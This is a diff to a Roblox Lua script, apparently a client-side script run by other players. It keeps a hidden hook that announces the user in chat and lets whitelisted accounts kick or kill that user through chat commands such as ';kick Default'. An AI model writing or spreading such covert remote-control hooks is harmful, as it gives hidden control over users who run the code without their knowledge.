@@ -464,23 +464,20 @@ players.PlayerAdded:Connect(function(player)
 		task.wait(4)
 		game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("....", "All")
 		bruh = player.Name
-		while true do 
-			task.wait() 
-			player.Chatted:Connect(function(message)
-				if table.find(wl,player.UserId) and message == ";kick Default" then
-					game.Players.LocalPlayer:Kick("imagine")
-				end
-				if table.find(wl,player.UserId) and message == ";wreck Default" then
-					game.Players.LocalPlayer.Character.Humanoid.Health = 0
-				end
-			end)
-		end
+	
+		task.wait() 
+		player.Chatted:Connect(function(message)
+			if table.find(wl,player.UserId) and message == ";kick Default" then
+				game.Players.LocalPlayer:Kick("imagine")
+			end
+			if table.find(wl,player.UserId) and message == ";wreck Default" then
+				game.Players.LocalPlayer.Character.Humanoid.Health = 0
+			end
 
+		end)
 	end
 
 end)
-
-
 
 local function x() 
 	print("2")
